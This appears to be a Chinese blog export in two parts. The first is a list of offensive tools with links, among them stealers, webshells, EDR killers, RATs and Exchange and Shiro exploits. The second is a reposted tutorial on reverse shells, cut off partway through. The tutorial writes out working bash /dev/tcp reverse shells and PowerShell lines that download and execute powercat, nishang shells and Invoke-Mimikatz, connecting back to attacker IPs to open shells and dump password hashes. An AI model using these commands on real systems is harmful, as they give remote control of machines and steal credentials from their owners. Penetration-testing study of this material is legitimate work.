<h2 id="reNgine"><a href="#reNgine" class="headerlink" title="reNgine"></a><strong>reNgine</strong></h2><p>用于在Web应用程序的渗透测试期间收集信息。reNgine具有可自定义的扫描引擎，可用于扫描网站，端点和收集信息。</p>
<p>地址：<a href="https://github.com/Serizao/rengine">https://github.com/Serizao/rengine</a></p>
<h2 id="PortBrute"><a href="#PortBrute" class="headerlink" title="PortBrute"></a><strong>PortBrute</strong></h2><p>一款跨平台小巧的端口爆破工具</p>
<p>支持爆破FTP&#x2F;SSH&#x2F;SMB&#x2F;MSSQL&#x2F;MYSQL&#x2F;POSTGRESQL&#x2F;MONGOD &#x2F;</p>
<p>地址：<a href="https://github.com/awake1t/PortBrute">https://github.com/awake1t/PortBrute</a></p>
<h2 id="365-Stealer"><a href="#365-Stealer" class="headerlink" title="365-Stealer"></a><strong>365-Stealer</strong></h2><p>365-Stealer是用python3编写的工具，它通过使用网络钓鱼获得的access_token从受害者office365窃取数据。它窃取Outlook邮件，附件，OneDrive文件，OneNote笔记并注入宏。</p>
<p>地址：<a href="https://github.com/AlteredSecurity/365-Stealer">https://github.com/AlteredSecurity/365-Stealer</a></p>
<h2 id="ARL"><a href="#ARL" class="headerlink" title="ARL"></a><strong>ARL</strong></h2><p>资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
<p>地址：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
<h2 id="免费的BurpSuitePro版本"><a href="#免费的BurpSuitePro版本" class="headerlink" title="免费的BurpSuitePro版本"></a><strong>免费的BurpSuitePro版本</strong></h2><p>地址：<a href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></p>
<h2 id="tvnjviewer4cs"><a href="#tvnjviewer4cs" class="headerlink" title="tvnjviewer4cs"></a><strong>tvnjviewer4cs</strong></h2><p>用于构建Cobalt Strike的TightVNC库</p>
<p>地址：<a href="https://github.com/Skactor/tvnjviewer4cs">https://github.com/Skactor/tvnjviewer4cs</a></p>
<h2 id="Reverse-dirty"><a href="#Reverse-dirty" class="headerlink" title="Reverse_dirty"></a><strong>Reverse_dirty</strong></h2><p>更改的脏牛提权代码，可以往任意文件写入任意内容</p>
<p>地址：<a href="https://github.com/Rvn0xsy/reverse_dirty">https://github.com/Rvn0xsy/reverse_dirty</a></p>
<h2 id="ShiroScan"><a href="#ShiroScan" class="headerlink" title="ShiroScan"></a><strong>ShiroScan</strong></h2><p>Burp插件 ShiroScan 主要用于框架、无dnslog key检测</p>
<p>地址：<a href="https://github.com/Daybr4ak/ShiroScan">https://github.com/Daybr4ak/ShiroScan</a></p>
<h2 id="CVE-2019-0708-EXP-Windows"><a href="#CVE-2019-0708-EXP-Windows" class="headerlink" title="CVE-2019-0708-EXP-Windows"></a><strong>CVE-2019-0708-EXP-Windows</strong></h2><p>CVE-2019-0708-EXP-Windows版单文件exe版,运行后直接在当前控制台反弹System权限Shell</p>
<p>地址：<a href="https://github.com/cbwang505/CVE-2019-0708-EXP-Windows">https://github.com/cbwang505/CVE-2019-0708-EXP-Windows</a></p>
<h2 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a><strong>渗透测试工具</strong></h2><p>地址：<a href="https://github.com/S3cur3Th1sSh1t/Pentest-Tools">https://github.com/S3cur3Th1sSh1t/Pentest-Tools</a></p>
<h2 id="GoScan"><a href="#GoScan" class="headerlink" title="GoScan"></a><strong>GoScan</strong></h2><p>Suzaku是采用Golang语言编写的一款综合资产搜集系统,适合红队、SRC等使用</p>
<p>地址：<a href="https://github.com/CTF-MissFeng/GoScan">https://github.com/CTF-MissFeng/GoScan</a></p>
<h2 id="PHPWebshell"><a href="#PHPWebshell" class="headerlink" title="PHPWebshell"></a><strong>PHPWebshell</strong></h2><p>php大马|php一句话|webshell|免杀过狗|渗透|黑客</p>
<p>地址： <a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a> 大马有后门，请谨慎使用</p>
<h2 id="Viper图形化红队渗透工具"><a href="#Viper图形化红队渗透工具" class="headerlink" title="Viper图形化红队渗透工具"></a><strong>Viper图形化红队渗透工具</strong></h2><p>地址:<a href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a></p>
<p>使用文档:<a href="https://www.yuque.com/funnywolfdoc/viperdoc">https://www.yuque.com/funnywolfdoc/viperdoc</a></p>
<h2 id="基于BurpSuite的一款FOFA-Pro-插件"><a href="#基于BurpSuite的一款FOFA-Pro-插件" class="headerlink" title="基于BurpSuite的一款FOFA Pro 插件"></a><strong>基于BurpSuite的一款FOFA Pro 插件</strong></h2><p>地址:<a href="https://github.com/0nise/burp-fofa">https://github.com/0nise/burp-fofa</a></p>
<h2 id="ShiroScan-1"><a href="#ShiroScan-1" class="headerlink" title="ShiroScan"></a><strong>ShiroScan</strong></h2><p>Shiro&lt;&#x3D;1.2.4反序列化，一键检测工具</p>
<p>地址：<a href="https://github.com/sv3nbeast/ShiroScan">https://github.com/sv3nbeast/ShiroScan</a></p>
<h2 id="BerylEnigma"><a href="#BerylEnigma" class="headerlink" title="BerylEnigma"></a><strong>BerylEnigma</strong></h2><p>一个为渗透测试与CTF而制作的工具集，主要实现一些加解密的功能。</p>
<p>地址：<a href="https://github.com/ffffffff0x/BerylEnigma">https://github.com/ffffffff0x/BerylEnigma</a></p>
<h2 id="Ary"><a href="#Ary" class="headerlink" title="Ary"></a><strong>Ary</strong></h2><p>Ary 是一个集成类工具，主要用于调用各种安全工具，从而形成便捷的一键式渗透。</p>
<p>地址：<a href="https://github.com/TeraSecTeam/ary">https://github.com/TeraSecTeam/ary</a></p>
<h2 id="DumpAll"><a href="#DumpAll" class="headerlink" title="DumpAll"></a><strong>DumpAll</strong></h2><p>一款信息泄漏利用工具，适用于.git&#x2F;.svn源代码泄漏和.DS_Store泄漏</p>
<p>地址：<a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a></p>
<h2 id="Mailget"><a href="#Mailget" class="headerlink" title="Mailget"></a><strong>Mailget</strong></h2><p>通过脉脉用户猜测企业邮箱</p>
<p>地址：<a href="https://github.com/Ridter/Mailget">https://github.com/Ridter/Mailget</a></p>
<h2 id="OneDragon"><a href="#OneDragon" class="headerlink" title="OneDragon"></a><strong>OneDragon</strong></h2><p>OneDragon 安全圈一条龙服务，全自动化挖洞，助力挖SRC的赏金猎人白帽子，一键实现子域名扫描，全端口扫描，目录扫描，漏洞扫描</p>
<h2 id="Fast-GitHub"><a href="#Fast-GitHub" class="headerlink" title="Fast-GitHub"></a><strong>Fast-GitHub</strong></h2><p>国内Github下载很慢，用上了这个插件后，下载速度嗖嗖嗖的~</p>
<p>地址：<a href="https://github.com/fhefh2015/Fast-GitHub">https://github.com/fhefh2015/Fast-GitHub</a></p>
<h1 id="FrpProPlugin"><a href="#FrpProPlugin" class="headerlink" title="FrpProPlugin"></a>FrpProPlugin</h1><p>frp0.33修改版,过流量检测,免杀,支持加载远程配置文件可用于cs直接使用的插件</p>
<p>地址：<a href="https://github.com/mstxq17/FrpProPlugin">https://github.com/mstxq17/FrpProPlugin</a></p>
<h1 id="DuckMemoryScan"><a href="#DuckMemoryScan" class="headerlink" title="DuckMemoryScan"></a>DuckMemoryScan</h1><p>一个简单寻找包括不限于iis劫持,无文件木马,shellcode免杀后门的工具,由huoji花了1天编写,编写时间2021-02-24 !!!本程序需要64位编译才能回溯x64的程序堆栈,请勿执行32位编译!!! !!!本工具不能代替杀毒软件!!!</p>
<p>地址：<a href="https://github.com/huoji120/DuckMemoryScan">https://github.com/huoji120/DuckMemoryScan</a></p>
<h2 id="exchange-ssrf-rce"><a href="#exchange-ssrf-rce" class="headerlink" title="exchange-ssrf-rce"></a><strong>exchange-ssrf-rce</strong></h2><p>地址：<a href="https://github.com/jeningogo/exchange-ssrf-rce">https://github.com/jeningogo/exchange-ssrf-rce</a></p>
<h1 id="captcha-killer"><a href="#captcha-killer" class="headerlink" title="captcha-killer"></a>captcha-killer</h1><p>captcha-killer要解决的问题是让burp能<strong>用上</strong>各种验证码识别技术</p>
<p>地址：<a href="https://github.com/ffffffff0x/BerylEnigma">https://github.com/ffffffff0x/BerylEnigma</a></p>
<h2 id="Vuldebug"><a href="#Vuldebug" class="headerlink" title="Vuldebug"></a><strong>Vuldebug</strong></h2><p>JAVA 漏洞调试项目，主要为复现、调试java相关的漏洞。</p>
<p>地址：<a href="https://github.com/0nise/vuldebug">https://github.com/0nise/vuldebug</a></p>
<h1 id="Microsoft-Exchange多个高危漏洞"><a href="#Microsoft-Exchange多个高危漏洞" class="headerlink" title="Microsoft Exchange多个高危漏洞"></a>Microsoft Exchange多个高危漏洞</h1><p>ProxyLogon Full Exploit Chain PoC (CVE-2021–26855, CVE-2021–26857, CVE-2021–26858, CVE-2021–27065)</p>
<p>地址：<a href="https://github.com/herwonowr/exprolog">https://github.com/herwonowr/exprolog</a></p>
<h2 id="USBCopyer-插上U盘自动按需复制文件"><a href="#USBCopyer-插上U盘自动按需复制文件" class="headerlink" title="USBCopyer: 插上U盘自动按需复制文件"></a>USBCopyer: 插上U盘自动按需复制文件</h2><p>用于在插上目标U盘后自动按需复制该U盘的文件。”备份&amp;偷U盘文件的神器”</p>
<p><strong>使用场景：</strong></p>
<ol>
<li>获取授课教师的课件</li>
<li>获取插到某台公用电脑上的U盘的数据</li>
<li>快捷地备份U盘（从V5.0开始）</li>
<li>备份U盘的同时进行版本控制</li>
</ol>
<p>地址：<a href="https://github.com/kenvix/USBCopyer">https://github.com/kenvix/USBCopyer</a></p>
<h1 id="Backstab"><a href="#Backstab" class="headerlink" title="Backstab"></a>Backstab</h1><p>一种杀死反恶意软件保护进程的工具</p>
<p>拥有这些本地管理员凭据但 EDR 挡住了路？解钩或直接系统调用对 EDR 不起作用？为什么不干脆杀了它？Backstab 是一种工具，能够利用 sysinternals 的 Process Explorer (ProcExp) 驱动程序杀死受反恶意软件保护的进程，该驱动程序由 Microsoft 签名。</p>
<p>地址：<a href="https://github.com/Yaxser/Backstab">https://github.com/Yaxser/Backstab</a></p>
<h1 id="shiro反序列化漏洞综合利用-v2-0"><a href="#shiro反序列化漏洞综合利用-v2-0" class="headerlink" title="shiro反序列化漏洞综合利用 v2.0"></a>shiro反序列化漏洞综合利用 v2.0</h1><p>shiro反序列化漏洞综合利用,包含（回显执行命令&#x2F;注入内存马）</p>
<p>地址：<a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
<h1 id="gadgetinspector"><a href="#gadgetinspector" class="headerlink" title="gadgetinspector"></a>gadgetinspector</h1><p>利用链、漏洞检测工具</p>
<p>地址：<a href="https://github.com/5wimming/gadgetinspector">https://github.com/5wimming/gadgetinspector</a></p>
<h2 id="码小六-GitHub-代码泄露监控系统"><a href="#码小六-GitHub-代码泄露监控系统" class="headerlink" title="码小六 - GitHub 代码泄露监控系统"></a><strong>码小六 - GitHub 代码泄露监控系统</strong></h2><p>漏洞靶场-快速搭建Web安全漏洞和第三方组件漏洞环境，用于漏洞复现和研究</p>
<p>地址：<a href="https://github.com/4x99/code6">https://github.com/4x99/code6</a></p>
<h2 id="JSshell-version-3-1"><a href="#JSshell-version-3-1" class="headerlink" title="JSshell - version 3.1"></a>JSshell - version 3.1</h2><p>地址：<a href="https://github.com/shelld3v/JSshell">https://github.com/shelld3v/JSshell</a></p>
<h1 id="Sunflower-get-Password"><a href="#Sunflower-get-Password" class="headerlink" title="Sunflower_get_Password"></a>Sunflower_get_Password</h1><p>一款针对向日葵的识别码和验证码提取工具</p>
<p>地址：<a href="https://github.com/wafinfo/Sunflower_get_Password">https://github.com/wafinfo/Sunflower_get_Password</a></p>
<h2 id="ElegyRAT-C-Sharp"><a href="#ElegyRAT-C-Sharp" class="headerlink" title="ElegyRAT-C-Sharp"></a><strong>ElegyRAT-C-Sharp</strong></h2><p>Windows C# 的开源远程管理工具（基于 AsyncRAT）</p>
<p>ElegyRAT 是一款远程访问工具（Be Based On AsyncRAT），旨在通过安全的加密连接远程JK和协助其他计算机，主要重写任务启动项和个别插件，方便绕过AV静态查杀和行为拦截。仅供学习研究，请勿用于非法用途。</p>
<p>地址：<a href="https://github.com/zhaoweiho/ElegyRAT-C-Sharp">https://github.com/zhaoweiho/ElegyRAT-C-Sharp</a></p>
<h2 id="Backstab-1"><a href="#Backstab-1" class="headerlink" title="Backstab"></a>Backstab</h2><p>MM-Wiki 一个轻量级的企业知识分享与团队协同软件，可用于快速构建企业 Wiki 和团队知识分享平台。部署方便，使用简单，帮助团队构建一个信息共享、文档管理的协作环境。</p>
<p>感兴趣的小伙伴可以用来部署团队和安全知识分享的wiki平台，也可以进行二次开发，作为团队内部Wiki资源共享平台</p>
<p>地址：<a href="https://github.com/phachon/mm-wiki">https://github.com/phachon/mm-wiki</a></p>
<h2 id="seeyon-exp"><a href="#seeyon-exp" class="headerlink" title="seeyon_exp"></a><strong>seeyon_exp</strong></h2><p>致远OA综合利用工具</p>
<p>地址：<a href="https://github.com/Summer177/seeyon_exp">https://github.com/Summer177/seeyon_exp</a></p>
<h2 id="X-C2"><a href="#X-C2" class="headerlink" title="X-C2"></a>X-C2</h2><p>X系列安全工具-X-C2-后渗透框架 暂未开源</p>
<p>地址：<a href="https://github.com/RedTeamWing/X-C2">https://github.com/RedTeamWing/X-C2</a></p>
<h2 id="NATBypass"><a href="#NATBypass" class="headerlink" title="NATBypass"></a>NATBypass</h2><p>一款lcx（htran）在golang下的实现</p>
<p>通过主动连接具有公网IP的电脑打通隧道可实现内网穿透，让内网主机提供的服务能够借助外网主机来访问。软件实现的端口转发，透明代理，在主机限制入站规则但未限制出站规则的特定情况下可绕过防火墙。</p>
<p>地址：<a href="https://github.com/cw1997/NATBypass">https://github.com/cw1997/NATBypass</a></p>
<h2 id="bypassWAF"><a href="#bypassWAF" class="headerlink" title="bypassWAF"></a>bypassWAF</h2><p>用于mssql手注生成混淆payload，即参数污染</p>
<p>bypassWAF:mssql手注混淆payload,可用于bypass 安全狗+宝塔,环境(iis+aspx)</p>
<p>generationData_bypass:用于生成垃圾数据</p>
<p>地址：<a href="https://github.com/safe6Sec/bypassWAF">https://github.com/safe6Sec/bypassWAF</a></p>
<h2 id="PIC-Privileges"><a href="#PIC-Privileges" class="headerlink" title="PIC-Privileges"></a>PIC-Privileges</h2><p>从内存中的目标文件构建和执行位置无关的 Shellcode</p>
<p>具体请参考文章：</p>
<p><a href="https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/">https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/</a></p>
<p>地址：<a href="https://github.com/paranoidninja/PIC-Get-Privileges">https://github.com/paranoidninja/PIC-Get-Privileges</a></p>
<h2 id="mssqlproxy"><a href="#mssqlproxy" class="headerlink" title="mssqlproxy"></a>mssqlproxy</h2><p>mssqlproxy 是一个工具包，旨在通过套接字重用通过受损的 Microsoft SQL Server 在受限环境中执行横向移动</p>
<p>地址：<a href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a></p>
<h2 id="Crawlergo-x-Rad-x-XRAY"><a href="#Crawlergo-x-Rad-x-XRAY" class="headerlink" title="Crawlergo_x_Rad_x_XRAY"></a>Crawlergo_x_Rad_x_XRAY</h2><p>1、目标在target.txt中，使用python3 launcher.py，一键启动爬虫加漏扫</p>
<p>2、使用rad+crawlergo，两个爬虫工具互相弥补，查漏补缺</p>
<h2 id="Bypass-Cloudflare"><a href="#Bypass-Cloudflare" class="headerlink" title="Bypass Cloudflare"></a>Bypass Cloudflare</h2><p>使用 Cloudflare Workers 绕过 Coudflare 机器人保护</p>
<p>详细使用文章：</p>
<p><a href="https://jychp.medium.com/how-to-bypass-cloudflare-bot-protection-1f2c6c0c36fb">https://jychp.medium.com/how-to-bypass-cloudflare-bot-protection-1f2c6c0c36fb</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>常见反弹shell方式</title>
    <url>/posts/89b04201.html</url>
    <content><![CDATA[<blockquote>
<p> 转载：原创 三个大石头 <a href="javascript:void(0);">系统安全运维</a> <em>8月9日</em></p>
</blockquote>
<p>本章目录：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F/image-20210922152629844.png" alt="image-20210922152629844"></p>
<p>有了菜刀的虚拟终端为啥还要反弹shell？</p>
<p>webshell管理工具中虚拟终端不是真正的shell（命令解析器），通过客户端和服务器的webshell共同完成的用于执行命令的模块，当用户在提权时获取的管道是无法通过虚拟终端来使用。虚拟终端无法执行交互式命令、无法控制进程状态、无法补全命令等等，非常不利于提权操作以及横向移动，所以，必须反弹 shell（将目标机器的命令解析器反弹给攻击者或者测试人员，命令解析器的权限取决于WEB服务器的权限，一般情况下，其权限很低）。</p>
<p>目标机上反弹shell到攻击者的机器，攻击者需要监听nc</p>
<h4 id="windows-x2F-linux反弹shell"><a href="#windows-x2F-linux反弹shell" class="headerlink" title="windows&#x2F;linux反弹shell"></a><strong>windows&#x2F;linux反弹shell</strong></h4><h5 id="1、bash反弹shell"><a href="#1、bash反弹shell" class="headerlink" title="1、bash反弹shell"></a><strong>1、bash反弹shell</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F/image-20210922152747352.png" alt="image-20210922152747352"></p>
<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
<h5 id="2、Powershell反弹shell"><a href="#2、Powershell反弹shell" class="headerlink" title="2、Powershell反弹shell"></a><strong>2、Powershell反弹shell</strong></h5><h6 id="2-1）Powershell介绍"><a href="#2-1）Powershell介绍" class="headerlink" title="2.1）Powershell介绍"></a><strong>2.1）Powershell介绍</strong></h6><p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。</p>
<p>一旦攻击者可以在一台计算机上运行代码，他们便可以下载powershell脚本文件（.ps1）到磁盘执行，脚本可以在内存中运行(无文件化)。我们可以将powershell看做是命令提示符cmd.exe的扩展。</p>
<p>优点：</p>
<p>① WIN7以上默认安装(以下没有)② Powershell脚本可以运行再内存中，不需要写入磁盘③ 可以远程加载Powershell脚本并执行④ 很多安全软件不能检测到Powershell的活动(系统自带)⑤ CMD.exe通常被阻止运行，Powershell不会   ⑥ 可以用来管理活动目录(AD)</p>
<p>各个系统中Powershell的版本如下：</p>
<table>
<thead>
<tr>
<th><strong>操作系统</strong></th>
<th><strong>PowerShell版本</strong></th>
<th><strong>是否可升级</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Window 7&#x2F;Windows server 2008</strong></td>
<td>2.0</td>
<td>可以升级3.0、4.0</td>
</tr>
<tr>
<td><strong>Window 8&#x2F; Windows server 2012</strong></td>
<td>3.0</td>
<td>可升级4.0</td>
</tr>
<tr>
<td><strong>Window 8.1&#x2F; Windows server 2012 R2</strong></td>
<td>4.0</td>
<td>升级5.0  5.1</td>
</tr>
</tbody></table>
<p>可以在输入Get-Host或者$PSVersionTable.PSVERSION来查看版本信息，如下所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F/image-20210922152921834.png" alt="image-20210922152921834"></p>
<p><em><strong>2.1.1. powershell策略</strong></em></p>
<p>Get-ExecutionPolicy 查看当前环境执行脚本的策略restricted 不允许执行脚本remotesigned 可以执行本地脚本 但是从网上下载的脚本不能运行allsigned 对签名的脚本才能执行unrestricted 允许执行任意脚本   Set-ExecutionPolicy 设置脚本运行策略</p>
<p><em><strong>2.1.2. Powershell攻击利用</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 绕过策略加载执行本地文件</span><br><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File xxx.ps1本地隐藏绕过权限执行脚本</span><br><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Nonl IEX (New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;); 用IEX下载远程PS1脚本绕过权限执行</span><br></pre></td></tr></table></figure>



<p>参数说明 </p>
<p>ExecutionPolicy Bypass : 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全规则;</p>
<p>WindowStyle Hidden ：隐藏窗口;</p>
<p>NoLogo : 启动不显示版权标志的PowerShell;</p>
<p>NonInteractive (-Nonl) : 非交互模式，PowerShell不为用户提供交互的提示;</p>
<p>NoProfile (-Nop): PowerShell控制台不加载当前用户的配置文件;</p>
<p>Noexit : 执行后不退出Shell。这在使用键盘记录等脚本时非常重要。</p>
<h6 id="2-2、Powercat反弹TCP-shell"><a href="#2-2、Powercat反弹TCP-shell" class="headerlink" title="2.2、Powercat反弹TCP - shell"></a><strong>2.2、Powercat反弹TCP - shell</strong></h6><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat.</p>
<p>项目地址：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<p><em><strong>攻击者监听：（反向）</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nc –lvnp 9999</span><br></pre></td></tr></table></figure>

<p>目标机反弹CMD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;); powercat -c 192.168.1.4 -p 9999  -e cmd</span><br></pre></td></tr></table></figure>

<p><em><strong>目标机执行下面的代码：（正向）</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;); powercat -l -p 9999  -e cmd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机 nc 192.168.40.172 9999</span><br></pre></td></tr></table></figure>

<h6 id="2-3、nishang反弹shell"><a href="#2-3、nishang反弹shell" class="headerlink" title="2.3、nishang反弹shell"></a><strong>2.3、nishang反弹shell</strong></h6><p>Nishang(<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP&#x2F; UDP&#x2F; HTTP&#x2F;HTTPS&#x2F; ICMP等类型shell。</p>
<p>Nishang要在PowerShell3.0以上的环境下才可以正常使用，在window 7或者server2008上可能会出现一些异常。</p>
<p>导入Nishang模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\nishang.psm1</span><br></pre></td></tr></table></figure>



<p>导入成功后，产看Nishang中模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-Command –Module nishang</span><br></pre></td></tr></table></figure>

<p>Nishang攻击模块有（只介绍部分）：</p>
<p>Check-VM:检测目标机器是否为虚拟机</p>
<p>Invoke-CredentialsPhish:欺骗目标主机用户，用作钓鱼</p>
<p>Copy-VSS:利用Volume Shaodow Copy复制sam文件</p>
<p>FireBuster FireLiStener:用作内网环境扫描</p>
<p>Keylogger:用作键盘记录</p>
<p>Invoke-Mimikatz:类似Mimikatz，直接获取系统账号明文密码</p>
<p>Get-PassHashes:获取系统密码hash值</p>
<p>ADD-persistence 用作持久化</p>
<p>ExetoText 作用exe转换为Text</p>
<p><em><strong>2.3.1 基于TCP的Powershell交互式shell</strong></em></p>
<p>在目标机上执行如下的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.4 -port 9999</span><br></pre></td></tr></table></figure>



<p>其中，Invoke-PowerShellTcp是基于TCP协议的Powershell正向连接或者反向连接shell，其参数如下：</p>
<p>Ø IPAddress 反向连接时设置的IP</p>
<p>Ø Port 正向连接时设置的端口，前面要写上-Bind参数</p>
<p>Ø Reverse  反向连接</p>
<p>Ø Bind 正向连接</p>
<p><strong>反向连接</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.4 -port 9999</span><br></pre></td></tr></table></figure>

<p>注意：可将nishang下载到攻击者本地，执行如下的代码（此时推荐使用python搭建简易WEB服务）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.14/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1. 4 -port 6666</span><br></pre></td></tr></table></figure>



<p><strong>正向连接：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Bind -Port 4444</span><br></pre></td></tr></table></figure>



<p><em><strong>2.3.2 基于UDP的Poershell交互式Shell</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1&#x27;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.1.4 -port 5399</span><br></pre></td></tr></table></figure>

<p>或者执行如下的代码（需要导入NIshang的模块）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F/image-20210922153812092.png" alt="image-20210922153812092"></p>
<p>在攻击者的电脑上执行如下的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lup 6005</span><br></pre></td></tr></table></figure>

<p>上述测试是反向连接，那么正向连接的时候，在攻击者的电脑上运行的命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvu 192.168.1.24 4555</span><br></pre></td></tr></table></figure>

<p><strong><em>*</em>***2.3.****3 基于ICMP的Poershell交互式Shell*</strong>*</p>
<p>需要借助于icmpsh_m.py文件，其用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python icmpsh_m.py -h</span><br></pre></td></tr></table></figure>

<p>用法（攻击机器执行）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./icmpsh-m.py &lt;source IP address&gt; &lt;destination IP address&gt;</span><br></pre></td></tr></table></figure>

<p>在被攻击的机器上执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-PowerShellIcmp -IPAddress &lt;source IP address&gt;</span><br></pre></td></tr></table></figure>



<p><em><strong>2.3.4 基于HTTP&#x2F;HTTPS的Poershell交互式Shell</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP: Invoke-PoshRatHttp –IPAddess 192.168.1.4 –Port 4444HTTPS: Invoke-PoshRatHttps  –IPAddess 192.168.1.4 –Port 4444</span><br></pre></td></tr></table></figure>



<p>然后会生成一个powershell如下的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">····IEX  ((New-Object Net.WebClient).DownloadString(‘http://192.168.1.4:4444/connect’))</span><br></pre></td></tr></table></figure>

<p>然后复制该命令在被攻击机器上执行即可，便可看到反弹的shell</p>
<p><em><strong>2.3.5 Mimikatz模块获取hash密码</strong></em></p>
<p>目标机运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.40.128/Invoke-Mimikatz.ps1 &#x27;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure>

<p>#运行完会直接显示hash，若是没有kb281977补丁，还可显示明文密码 </p>
<p>*<strong>2.3.6 Porscan模块扫描端口</strong></p>
